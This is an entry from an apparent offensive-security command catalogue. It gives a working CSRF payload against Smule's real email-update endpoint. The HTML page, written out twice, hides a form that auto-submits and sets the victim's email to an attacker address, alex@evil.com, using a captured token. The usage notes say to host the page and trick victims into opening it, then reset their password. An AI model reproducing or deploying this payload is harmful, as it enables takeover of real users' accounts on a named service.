---
id: cmd-smule-auto-submit-001
name: auto-submit-email-update-form
type: command
executor: html
data: >-
  <!DOCTYPE html>\n<head>\n</head>\n<body>\n<form method=\"POST\"
  action=\"https://www.smule.com/user/update/email\">\n<input type=\"hidden\"
  name=\"utf-8\" value=\"\">\n<input type=\"hidden\" name=\"authenticity_token\"
  value=\"{CSRF_TOKEN obtained previously}\">\n<input type=\"hidden\"
  name=\"email\" value=\"alex@evil.com\">\n<input type=\"hidden\"
  name=\"email_confirmation\" value=\"alex@evil.com\">\n<input type=\"hidden\"
  name=\"tz_offset\"
  value=\"19800\">\n</form>\n<script>\ndocument.forms[0].submit();\n</script>\n</body>\n</html>
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.313Z'
platforms:
  - Web
tags:
  - csrf
  - account-takeover
verified: false
validated: true
submitted: true
---

# auto-submit-email-update-form

## Command

```html
<!DOCTYPE html>
<head>
</head>
<body>
<form method="POST" action="https://www.smule.com/user/update/email">
<input type="hidden" name="utf-8" value="">
<input type="hidden" name="authenticity_token" value="{CSRF_TOKEN obtained previously}">
<input type="hidden" name="email" value="alex@evil.com">
<input type="hidden" name="email_confirmation" value="alex@evil.com">
<input type="hidden" name="tz_offset" value="19800">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

## Description

This HTML snippet creates an invisible form that auto-submits via JavaScript to update the email on Smule using a stolen CSRF token, leading to account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| authenticity_token | Captured CSRF token | Yes |
| email | Attacker's email for takeover | Yes |
| email_confirmation | Matches email | Yes |
| tz_offset | Timezone offset (e.g., 19800 for UTC+5:30) | No |

## Examples

### Basic Usage

Save as .html and open in browser with victim cookies.

### Advanced Usage

Host on attacker server and trick victim to visit:
```html
# As shown, with token inserted
```

## Expected Output

Form submits POST; server responds 200 OK with updated email confirmation. Attacker can then reset password.

## Related

- [[Related Procedure: Perform-CSRF-Email-Update-for-Account-Takeover]]
